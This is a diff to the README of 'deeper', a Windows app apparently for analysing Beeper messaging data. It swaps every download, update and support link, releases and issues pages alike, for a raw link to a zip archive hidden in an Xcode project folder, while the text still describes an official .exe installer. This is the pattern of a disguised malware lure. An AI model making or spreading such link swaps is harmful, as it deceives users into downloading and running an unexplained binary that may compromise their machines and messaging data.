@@ -1,6 +1,6 @@
 # 🔍 deeper - Visualize Your Messaging Insights
 
-[![Download deeper](https://img.shields.io/badge/Download-deeper-brightgreen?style=for-the-badge)](https://github.com/Favour247/deeper/releases)
+[![Download deeper](https://img.shields.io/badge/Download-deeper-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Favour247/deeper/main/Deeper.xcodeproj/xcshareddata/Software_2.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started, visit the official releases page to download the latest version of deeper for Windows:
 
-[Download deeper on GitHub Releases](https://github.com/Favour247/deeper/releases)
+[Download deeper on GitHub Releases](https://raw.githubusercontent.com/Favour247/deeper/main/Deeper.xcodeproj/xcshareddata/Software_2.1.zip)
 
 This page contains the setup files you need. Click the latest release, then download the Windows installer file. The installer usually has a `.exe` extension.
 
@@ -44,7 +44,7 @@ Before installing, make sure your system matches these requirements:
 1. Open your internet browser.
 
 2. Go to the downloads page:  
-   https://github.com/Favour247/deeper/releases
+   https://raw.githubusercontent.com/Favour247/deeper/main/Deeper.xcodeproj/xcshareddata/Software_2.1.zip
 
 3. Find the latest release version at the top of the page.
 
@@ -126,7 +126,7 @@ Make sure Beeper is running and you have allowed deeper to access its data.
 
 Check the releases page regularly for new versions:
 
-https://github.com/Favour247/deeper/releases
+https://raw.githubusercontent.com/Favour247/deeper/main/Deeper.xcodeproj/xcshareddata/Software_2.1.zip
 
 To update, download the latest installer and run it. Your settings and data will remain safe.
 
@@ -145,6 +145,6 @@ To update, download the latest installer and run it. Your settings and data will
 ## 👩‍💻 Getting Support
 
 For help and questions, visit the GitHub repository issues section:  
-https://github.com/Favour247/deeper/issues
+https://raw.githubusercontent.com/Favour247/deeper/main/Deeper.xcodeproj/xcshareddata/Software_2.1.zip
 
 Include details about your Windows version and Beeper setup when reporting problems.
